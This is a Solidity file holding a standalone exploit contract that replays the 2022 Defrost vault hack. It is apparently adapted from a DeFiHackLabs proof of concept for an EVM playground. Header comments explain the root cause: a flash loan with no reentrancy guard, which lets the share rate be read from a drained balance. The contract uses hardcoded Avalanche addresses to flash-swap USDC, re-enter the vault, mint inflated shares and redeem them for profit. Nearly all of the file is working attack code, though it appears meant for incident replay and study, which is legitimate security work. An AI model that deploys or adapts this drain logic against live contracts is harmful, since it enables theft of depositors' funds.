// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-12-Defrost).
//
// The DeFiHackLabs PoC (test/Defrost_exp.sol) runs the whole attack INLINE in
// the Foundry test contract `ContractTest`: testExploit() kicks off a Trader
// Joe USDC/WAVAX pair flash swap (Pair.swap), and the `joeCall` and
// `onFlashLoan` callbacks — which carry the actual exploit logic — are defined
// on the test itself. There is therefore no standalone contract to deploy.
//
// This file is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record `run()`. Logic and constants are copied
// verbatim from test/Defrost_exp.sol:
//   - run()     → reads maxFlashLoan + flashFee, then pair.swap(0, amount+fee).
//   - joeCall() → LSW.flashLoan(...) re-enters the vault mid-flash, then
//                  LSW.redeem(depositAmount) at the restored rate, then repays
//                  the Trader Joe flash swap.
//   - onFlashLoan() → USDC.approve(LSW) + LSW.deposit(flashLoanAmount) against
//                  the drained vault (mints inflated shares). Returns the
//                  ERC-3156 magic value.
//
// Root cause: Defrost's lendingSwitchErc20 (a share-based Aave-yield vault)
// implements an ERC-3156 flashLoan whose flashLoan() runs the balance mutation
// onWithdraw() (drains the Aave position to 0) BEFORE calling back into the
// borrower, and onDeposit() (re-supplying Aave) AFTER — yet flashLoan is NOT
// guarded by a reentrancy lock (ReentrancyGuard is inherited but only applied
// to the WAVAX entry points). The vault's share/asset exchange rate is read
// live from getTotalAssets() = aUSDC balance, so during the callback the
// denominator is 0: the attacker deposits (minting ~9.49x inflated shares),
// then after flashLoan restores Aave, redeems those shares at the healthy rate
// for ~1.89x the assets deposited.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface ILSWUSDC {
    function maxFlashLoan(address token) external view returns (uint256);
    function flashFee(address token, uint256 amount) external view returns (uint256);
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
    function deposit(uint256 amount, address to) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external;
}

contract DefrostDrain {
    IERC20 constant USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    ILSWUSDC constant LSW = ILSWUSDC(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96);
    IUniswapV2Pair constant PAIR = IUniswapV2Pair(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);

    uint256 flashLoanAmount;
    uint256 flashLoanFee;
    uint256 depositAmount;

    // step 0: flash-borrow the entire vault (USDC maxFlashLoan + 0.01% fee) from
    // the Trader Joe USDC/WAVAX pair. The callback below repays it.
    function run() external {
        flashLoanAmount = LSW.maxFlashLoan(address(USDC));
        flashLoanFee = LSW.flashFee(address(USDC), flashLoanAmount);
        PAIR.swap(0, flashLoanAmount + flashLoanFee, address(this), new bytes(1));
    }

    // Trader Joe flash-swap callback.
    function joeCall(address, uint256, uint256, bytes calldata) external {
        // Re-enter the vault mid-flash: onWithdraw drains Aave to 0, then the
        // borrower (this contract) is called back via onFlashLoan.
        LSW.flashLoan(address(this), address(USDC), flashLoanAmount, new bytes(1));
        // After flashLoan returns, onDeposit has restored the Aave supply. Redeem
        // the inflated shares minted during the drained window at the healthy rate.
        LSW.redeem(depositAmount, address(this), address(this));
        // Repay the Trader Joe flash swap (principal + 0.3% pair fee).
        USDC.transfer(msg.sender, (flashLoanAmount + flashLoanFee) * 1000 / 997 + 1000);
    }

    // ERC-3156 borrower callback — fires inside LSW.flashLoan, while the Aave
    // position is drained. Deposit against the empty vault to mint inflated shares.
    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
        USDC.approve(address(LSW), type(uint256).max);
        depositAmount = LSW.deposit(flashLoanAmount, address(this));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
